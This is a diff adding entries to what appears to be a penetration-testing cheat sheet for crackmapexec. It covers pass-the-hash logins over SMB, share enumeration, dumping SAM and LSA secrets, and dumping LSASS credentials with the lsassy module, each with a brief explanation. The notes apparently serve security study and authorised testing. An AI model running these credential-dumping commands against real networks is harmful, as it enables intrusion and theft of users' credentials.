@@ -17,3 +17,16 @@ $ crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam
 
 $ crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares
 - with this command you are gaining access with the "pass the hash" attack and then enumerating shares on the machines you gained access to
+
+$ crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa
+- with this command you are gaining access with the "pass the hash" attack and then dumping the Local Security Authority on the machines you gained access to
+
+$ crackmapexec smb -L
+- with this command you are listing all the smb modules crackmapexec offers
+
+$ crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy
+- with this command you are gaining access with the "pass the hash" attack and then using the lsassy module to dump the lssas 
+- the lsass is responsible for security; but it stores user credentials that can be dumped (if a user is logged in at the time you might get creds that would not be otherwise available)
+
+$ cmedb
+- this command accesses a database of all your actions using crackmapexec and what you recovered with your commands
